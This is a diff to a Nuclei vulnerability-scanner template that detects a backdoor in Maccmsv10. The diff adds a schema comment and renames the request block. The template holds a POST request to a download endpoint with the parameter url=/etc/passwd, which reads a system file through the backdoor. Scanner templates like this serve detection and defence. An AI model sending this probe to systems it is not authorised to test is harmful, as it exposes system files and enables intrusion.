@@ -1,10 +1,11 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: maccmsv10-backdoor
 info:
   name: Maccmsv10 Backdoor
   author: princechaddha
   severity: critical
   tags: maccmsv10,rce
-requests:
+http:
   - method: POST
     path:
       - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
